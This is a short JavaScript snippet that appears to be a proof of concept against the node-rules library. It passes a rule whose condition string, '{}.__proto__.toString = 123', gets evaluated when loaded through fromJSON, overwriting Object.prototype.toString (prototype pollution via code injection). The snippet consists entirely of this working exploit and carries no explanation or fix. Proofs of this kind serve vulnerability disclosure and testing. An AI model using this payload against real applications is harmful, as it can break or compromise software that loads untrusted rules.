var A = require("node-rules");
var rules = {
  condition:"{}.__proto__.toString = 123",
  consequence:""
}
var a = new A();
a.fromJSON(rules);
